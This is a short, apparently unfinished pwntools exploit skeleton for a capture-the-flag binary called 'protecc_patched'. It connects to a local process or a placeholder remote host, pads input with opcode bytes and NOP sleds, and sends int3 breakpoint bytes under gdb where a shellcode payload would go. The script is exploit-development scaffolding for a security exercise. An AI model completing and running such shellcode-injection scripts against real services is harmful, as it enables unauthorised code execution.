#!/usr/bin/python2

from pwn import *

exe = ELF("protecc_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

g = lambda r : gdb.attach(r, gdbscript="brva 0x1770")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def pad_input(payload):
    input = "\x31\xED\x31\xc0"
    input += payload
    input += "\x90"*(164 - 20 - len(input))
    print len(input)
    return input

def main():
    r = conn()

    r.sendlineafter(":", "BITCH")
    
    code = pad_input("\xcc"*40)
    g(r)
    r.sendline(code)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
